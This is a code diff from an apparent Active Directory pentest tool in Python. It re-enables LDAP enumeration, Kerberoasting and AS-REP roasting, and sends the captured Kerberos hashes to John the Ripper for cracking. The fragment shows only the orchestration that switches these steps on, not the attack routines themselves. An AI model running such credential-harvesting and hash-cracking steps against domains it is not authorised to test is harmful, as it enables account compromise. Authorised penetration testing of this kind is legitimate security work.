@@ -377,14 +377,14 @@ class KerbExploit:
         configFileKerb = self.DefaultConfig('kerbHash.hash','--format=krb5tgs')
 
         configASREP['isHashFound'] = self.ASREP_Roastable(configASREP['ouputFile'])
-        #configFileKerb['isHashFound'] = self.Kerberoastable(userConfig['username'], userConfig['password'],configFileKerb['ouputFile'])
+        configFileKerb['isHashFound'] = self.Kerberoastable(userConfig['username'], userConfig['password'],configFileKerb['ouputFile'])
 
         if((configASREP['isHashFound'] or configFileKerb['isHashFound'])  and userConfig['baseDN']):
             printTitle("[-] Starting to crack hashs")
             if(configASREP['isHashFound']):
                 self.RunJohn(configASREP['ouputFile'], configASREP['formatHash'])
-            #if(configFileKerb['isHashFound']):
-            #    self.RunJohn(configFileKerb['ouputFile'], configFileKerb['formatHash'])
+            if(configFileKerb['isHashFound']):
+                self.RunJohn(configFileKerb['ouputFile'], configFileKerb['formatHash'])
 
 def ManageArg():
     parser = argparse.ArgumentParser(description='Pentest tool that detect misconfig in AD with LDAP', usage='%(prog)s -d [domain] -u [username] -p [password]')
@@ -456,7 +456,7 @@ def mainWork(userConfig):
     ldapEnum = LdapEnum(userConfig['baseDN'])
     ldapEnum.ConnectServerLdap(userConfig['domain'], userConfig['ipAddress'],userConfig['username'], userConfig['password'], userConfig['isSSL'])
 
-    #ldapEnum.StartEnum()
+    ldapEnum.StartEnum()
 
     kerbExploit = KerbExploit(ldapEnum,userConfig['domain'],userConfig['JohnPath'],userConfig['wordlistPath'],userConfig['ipAddress'])
     kerbExploit.StartKerbExploit(userConfig)
